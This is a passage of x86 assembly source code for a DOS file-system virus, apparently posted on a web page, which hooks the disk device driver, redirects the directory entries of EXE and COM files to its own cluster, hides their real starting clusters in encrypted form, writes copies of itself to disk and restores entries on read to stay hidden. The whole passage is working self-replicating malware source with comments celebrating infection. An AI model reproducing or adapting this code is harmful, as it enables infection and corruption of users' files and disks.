         and   [si],di
         or    [si],dx                          ; Set [si] to DI

         cmp   ax,dx                            ; Did we change the FAT?
         pop   ax                               ; i.e. Are we already on this
         pop   di                               ; disk?
         mov   word ptr cs:pointer+1,ax         ; Our own starting cluster
         je    _read_                           ; If we didn't infect, then
                                                ; leave the routine.  Oh
                                                ; welp-o.
         mov   dx,[si]
         push  ds
         push  si
         call  write                            ; Update the FAT
         pop   si
         pop   ds
         jnz   _read_                           ; Quit if there's an error
         call  driver
         cmp   [si],dx
         jne   _read_
         dec   ax
         dec   ax
         mul   cx                               ; Multiply by sectors/cluster
                                                ; to find the sector of the
                                                ; write
         add   ax,di
         adc   dx,0
         push  es
         pop   ds
         mov   word ptr [bx+12h],2              ; Byte/sector count
         mov   [bx+14h],ax                      ; Starting sector #
         test  dx,dx
         jz    less
         mov   word ptr [bx+14h],-1             ; Flag extended partition
         mov   [bx+1ah],ax                      ; Handle the sector of the
         mov   [bx+1ch],dx                      ; extended partition
less:    mov   [bx+10h],cs                      ; Transfer address segment
         mov   [bx+0eh],100h                    ; and the offset (duh)
         call  write                            ; Zopy ourselves!
                                                ; (We want to travel)
_read_:  std
         lea   di,[bx+1ch]                      ; Restore device driver header
         mov   cx,8                             ; from the stack
load:    pop   ax
         stosw
         loop  load
_read:   call  in_                              ; Call original device handler

         mov   cx,9
_inf_sec:
         mov   di,es:[bx+12h]                   ; Bytes/Sector
         lds   si,es:[bx+0eh]                   ; DS:SI = pointer to buffer
         sal   di,cl                            ; Multiply by 512
                                                ; DI = byte count
         xor   cl,cl
         add   di,si                            ; Go to address in the buffer
         xor   dl,dl                            ; Flag for an infection in
                                                ; function find
         push  ds
         push  si
         call  find                             ; Infect the directory
         jcxz  no_inf
         call  write                            ; Write it back to the disk
         and   es:[bx+4],byte ptr 07fh          ; Clear error bit in status
                                                ; word
no_inf:  pop   si
         pop   ds
         inc   dx                               ; Flag for a decryption in
                                                ; function find
         call  find                             ; Return right information to
                                                ; calling program
         jmp   ppp

;--------Subroutines

find:    mov   ax,[si+8]                        ; Check filename extension
         cmp   ax,"XE"                          ; in directory structure
         jne   com
         cmp   [si+10],al
         je    found
com:     cmp   ax,"OC"
         jne   go_on
         cmp   byte ptr [si+10],"M"
         jne   go_on
found:   test  [si+1eh],0ffc0h ; >4MB           ; Check file size high word
         jnz   go_on                            ; to see if it is too big
         test  [si+1dh],03ff8h ; <2048B         ; Check file size low word
         jz    go_on                            ; to see if it is too small
         test  [si+0bh],byte ptr 1ch            ; Check attribute for subdir,
         jnz   go_on                            ; volume label or system file
         test  dl,dl                            ; If none of these, check DX
         jnz   rest                             ; If not 0, decrypt
pointer: mov   ax,1234h                         ; mov ax, XX modified elsewhere
         cmp   ax,[si+1ah]                      ; Check for same starting
                                                ; cluster number as us
         je    go_on                            ; If it is, then try another
         xchg  ax,[si+1ah]                      ; Otherwise make it point to
                                                ; us.
gad:     xor   ax,1234h                         ; Encrypt their starting
                                                ; cluster
         mov   [si+14h],ax                      ; And put it in area reserved
                                                ; by DOS for no purpose
         loop  go_on                            ; Try another file
rest:    xor   ax,ax                            ; Disinfect the file
         xchg  ax,[si+14h]                      ; Get starting cluster
         xor   ax,word ptr cs:gad+1             ; Decrypt the starting cluster
         mov   [si+1ah],ax                      ; and put it back
go_on:   db    2eh,0d1h,6                       ; rol cs:[gad+1], 1
         dw    offset gad+1                     ; Change encryption and
         add   si,32                            ; go to next file
         cmp   di,si                            ; If it is not past the end of
         jne   find                             ; the buffer, then try again
         ret                                    ; Otherwise quit

check:   mov   ah,[bx+1]                        ; ah = unit code (block device
                                                ;                 only)
drive:   cmp   ah,-1                            ; cmp ah, XX can change.
                                                ; Compare with the last call
                                                ; -1 is just a dummy
                                                ; impossible value that will
                                                ; force the change to be true
         mov   byte ptr cs:[drive+2],ah         ; Save this call's drive
         jne   changed                          ; If not the same as last call
                                                ; media has changed
         push  [bx+0eh]                         ; If it is the same physical
                                                ; drive, see if floppy has
                                                ; been changed
         mov   byte ptr [bx+2],1                ; Tell original driver to do a
         call  in_                              ; media check (block only)
         cmp   byte ptr [bx+0eh],1              ; Returns 1 in [bx+0eh] if
         pop   [bx+0eh]                         ; media has not been changed
         mov   [bx+2],al                        ; Restore command code
changed: ret                                    ; CF,ZF set if media has not
                                                ; been changed, not set if
                                                ; has been changed or we don't
                                                ; know
write:   cmp   byte ptr es:[bx+2],8             ; If we want OUTPUT, go to
         jae   in_                              ; original device handler
                                                ; and return to caller
         mov   byte ptr es:[bx+2],4             ; Otherwise, request INPUT
         mov   si,70h
         mov   ds,si                            ; DS = our segment
modify:  mov   si,1234h                         ; Address is changed elsewhere
         push  [si]
         push  [si+2]
         mov   [si],offset i13pr
         mov   [si+2],cs
         call  in_                              ; Call original device handler
         pop   [si+2]
         pop   [si]
         ret

driver:  mov   word ptr es:[bx+12h],1           ; One sector
in_:                                            ; in_ first calls the strategy
                                                ; of the original device
                                                ; driver and then calls the
                                                ; interrupt handler
         db    09ah                             ; CALL FAR PTR
str_block:
         dw    ?,70h                            ; address
         db    09ah                             ; CALL FAR PTR
int_block:
         dw    ?,70h                            ; address
         test  es:[bx+4],byte ptr 80h           ; Was there an error?
         ret

convert: cmp   ax,0ff0h                         ; 0FFF0h if 12 bit FAT
         jae   fat_16                           ; 0FF0h = reserved cluster
         mov   si,3                             ; 12 bit FAT
         xor   word ptr cs:[si+gad-1],si        ; Change the encryption value
         mul   si                               ; Multiply by 3 and
         shr   ax,1                             ; divide by 2
         mov   di,0fffh                         ; Mark it EOF (low 12 bits)
         jnc   cont                             ; if it is even, continue
         mov   di,0fff0h                        ; otherwise, mark it EOF (high
         jmp   short cont                       ; 12 bits) and then continue
fat_16:  mov   si,2                             ; 16 bit FAT
         mul   si                               ; Double cluster #
         mov   di,0ffffh                        ; Mark it as end of file
cont:    mov   si,512
         div   si                               ; AX = sector number
                                                ; (relative to start of FAT)
                                                ; DX = offset in sector AX
header:  inc   ax                               ; Increment AX to account for
         ret                                    ; boot record

counter: dw    0

         dw    842h                             ; Attribute
                                                ;  Block device
                                                ;  DOS 3 OPEN/CLOSE removable
                                                ;        media calls supported
                                                ;  Generic IOCTL call supported
                                                ; Supports 32 bit sectors
         dw    offset main                      ; Strategy routine
         dw    offset rts                       ; Interrupt routine (rtf)
         db    7fh                              ; Number of subunits supported
                                                ; by this driver.  Wow, lookit
                                                ; it -- it's so large and juicy

; Parameter block format:
; 0  WORD Segment of environment
; 2 DWORD pointer to command line
; 6 DWORD pointer to 1st default FCB
;10 DWORD pointer to 2nd default FCB
param:   dw    0,80h,?,5ch,?,6ch,?

bpb_buf: db    32 dup(?)
f_name:  db    80 dup(?)

;--------The End.
dir_2   ends
        end     start


</textarea></td></tr></table></body></html>
